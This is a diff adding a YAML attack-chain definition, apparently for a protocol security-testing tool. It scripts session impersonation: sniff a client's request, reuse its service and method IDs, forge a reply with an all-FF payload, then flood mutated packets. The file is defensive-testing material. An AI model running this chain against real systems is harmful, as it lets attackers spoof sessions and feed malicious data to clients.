@@ -1,0 +1,48 @@
+id: AC-003
+name: 会话冒用攻击链
+description: >
+  嗅探合法客户端的 Request 报文，提取 session_id 和 client_id；
+  使用相同的 session_id 伪造 Response，欺骗客户端接受恶意数据。
+severity: high
+cvss: 7.0
+
+steps:
+  - id: sniff_request
+    action: wait_for
+    filter:
+      message_type: REQUEST
+      service_id: "0x1234"
+    timeout: 15
+
+  - id: delay_for_race
+    action: delay
+    delay_ms: 10
+
+  - id: send_fake_response
+    action: send
+    template: request
+    params:
+      service_id: "${sniff_request.service_id}"
+      method_id: "${sniff_request.method_id}"
+      payload: "FFFFFFFFFFFFFFFF"
+    delay_ms: 0
+
+  - id: flood_same_session
+    action: mutate
+    params:
+      service_id: "${sniff_request.service_id}"
+      layer: 3
+    repeat: 20
+    delay_ms: 5
+
+  - id: verify_confusion
+    action: wait_for
+    filter:
+      message_type: RESPONSE
+      service_id: "${sniff_request.service_id}"
+    timeout: 5
+    required: false
+
+success_criteria:
+  sniff_request_completed: true
+  send_fake_response_completed: true
